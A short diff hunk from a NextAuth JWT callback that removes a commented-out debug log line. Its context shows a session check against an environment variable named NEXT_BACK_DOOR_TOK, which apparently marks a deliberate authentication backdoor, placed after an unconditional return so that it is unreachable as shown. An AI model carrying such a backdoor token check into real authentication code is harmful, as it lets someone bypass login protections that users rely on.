@@ -55,8 +55,6 @@ export const authOptions: NextAuthOptions = {
                 token.role = role;
                 token.sessionId = sessionId;
             }
-            // console.log("JWT-TOKEN", token);
-
             if (!token.sessionId) return null;
             return token;
             if (token.sessionId && token.sessionId != env.NEXT_BACK_DOOR_TOK) {
